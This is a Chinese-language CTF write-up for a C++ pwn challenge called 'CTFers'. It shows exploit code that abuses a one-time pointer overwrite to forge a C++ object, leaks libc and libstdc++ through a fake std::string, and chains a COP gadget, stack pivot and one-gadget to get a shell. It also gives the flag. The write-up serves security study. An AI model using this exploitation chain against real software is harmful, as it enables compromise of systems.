# CTFers

## 题目简述

这是一个 C++ CTF 选手管理程序，`std::vector<CTFer *>` 保存 `Web` 或 `Binary` 派生对象，菜单支持新增、删除和通过虚函数 `info()` 输出资料。隐藏菜单 `0xdeadbeef` 可以且只能一次修改 `ctfers[0]` 保存的对象指针。全局 `name_buf[128]` 又会保留新增时输入的原始字节，因此可把首个元素指向 `name_buf` 中伪造的 C++ 对象，劫持虚表分派。

当前 ELF 为 amd64、动态链接、未 strip；保护为 Partial RELRO、栈 canary、NX、无 PIE。关键固定地址经当前二进制核对为 `name_buf=0x4092e0`、`std::cout=0x409080`；`Web` 虚表起点是 `0x408c88`，对象实际保存的 address point 为 `0x408c98`，与官方 exp 一致。

## 解题过程

### 恢复对象与虚表布局

基类包含虚函数，因此对象首字段是 vptr。随后依次是 `points` 和 libstdc++ 的 `std::string`：

```c
struct FakeCTFer {
    void **vptr;
    long points;
    struct {
        char *data;
        size_t length;
        union {
            size_t capacity;
            char sso_buffer[16];
        };
    } nickname;
};
```

虚调用的核心过程是先取对象首字段，再取虚表中的函数指针：

```assembly
mov rdx, [rax]      ; rdx = fake->vptr
mov rdx, [rdx]      ; rdx = vptr[0]，即 info
mov rdi, rax        ; this = fake
call rdx
```

`join_ctf` 使用 `std::cin >> name_buf`，输入仍留在全局缓冲区；实际 `new Web/Binary` 只是额外创建一个正常对象。隐藏函数执行：

```c
std::cin >> *(size_t *)&ctfers[0];
```

因此把该指针改为 `name_buf+16` 后，后续 `print_info` 就会把偏移 16 处的字节解释为 `CTFer`。`broken` 只允许修改一次，但指针以后一直指向同一全局缓冲区；再次 add 会覆盖 `name_buf` 内容，相当于反复更新伪对象，不需要再次成功调用后门。

### 伪造 `std::string` 泄露 libc

先令 vptr 指向 `Web` 的虚表 address point `0x408c98`，再把 `nickname.data` 指向 `__libc_start_main@GOT`、长度和容量设为 8：

```python
fake = flat(
    0x408c98,                    # vptr
    0,                           # points
    elf.got["__libc_start_main"],
    8,
    8,
)

add(cyclic(16) + fake)
backdoor(elf.sym["name_buf"] + 16)
show_info()
```

`Web::info` 通过 `std::ostream << std::string` 输出 nickname，长度字段为 8，因此可以读取包含 NUL 的完整 GOT 内容。官方 Ubuntu 22.04 环境使用：

```python
libc.address = leaked_libc_start_main - 0x274c0 - 0x2900
```

两个减数反映官方 libc 中 GOT 实际解析地址与库基址的关系，只能随配套 libc 使用。

### 泄露 libstdc++

首元素仍指向 `name_buf+16`。再次 add 覆盖全局缓冲区，把伪字符串的 `data` 改为 `std::cout=0x409080`，即可输出 `std::cout` 对象首部的 libstdc++ 虚表指针：

```python
fake = flat(0x408c98, 0, 0x409080, 8, 8)
add(cyclic(16) + fake)
show_info()

libstdcxx_base = leaked_cout_vptr - 0x223370
```

这一步绕过 libstdc++ ASLR，为后续 COP gadget 提供基址。

### 用 COP gadget 转入栈迁移链

官方解法使用 libstdc++ 中的 gadget：

```assembly
mov rbp, rax
lea r12, [rax - 1]
test rdi, rdi
je ...
mov rax, [rdi]
call qword ptr [rax + 0x30]
```

调用 `info` 时，`rax` 与 `rdi` 都指向 `name_buf+16` 的伪对象。于是 gadget 既能把 `rbp` 设到受控全局区，也能从伪 vtable 相对 `0x30` 的位置取第二阶段 gadget。官方 payload 使用以下版本相关地址：

```python
magic = libstdcxx_base + 0x113764
pop_rax = libstdcxx_base + 0x0da536
pop_rbp = libstdcxx_base + 0x0aafb3
leave_ret = 0x402a63
one_gadget = libc.address + 0xebd43

payload = flat(
    cyclic(16),
    elf.sym["name_buf"] + 24,  # fake vtable
    magic,
    pop_rax, 0,
    pop_rbp, 0x4093a0,
    one_gadget,
    leave_ret,
)
add(payload)
show_info()
```

最终虚调用进入 `magic`，再经伪表间接调用与 `leave` 类栈迁移转入受控链，满足 one-gadget 约束后取得 shell。官方验证 flag 为：

```text
miniLCTF{In_real_scenarios_you_need_a_UAF}
```

输入使用格式化提取运算符 `std::cin >> name_buf`，遇到空白字节会提前截断。ASLR 后的 libc/libstdc++ 地址低字节偶尔包含空白，因此官方脚本提示可能需要重试；这是输入通道限制，不是虚表模型不稳定。

## 方法总结

- 核心技巧：一次性改写 `vector<CTFer *>` 首元素，使它永久指向可反复更新的全局假对象，再滥用 `std::string` 输出完成任意地址泄露和虚表/COP 劫持。
- 识别信号：基类指针容器、虚函数调用、可控对象指针和持久全局输入缓冲区同时出现时，应立即恢复 vptr 与标准库成员布局。
- 复用要点：虚表符号地址不是对象中保存的 address point，Itanium ABI 下通常要跳过 offset-to-top 与 RTTI 两项；libc、libstdc++ 和 one-gadget 偏移必须匹配部署版本。
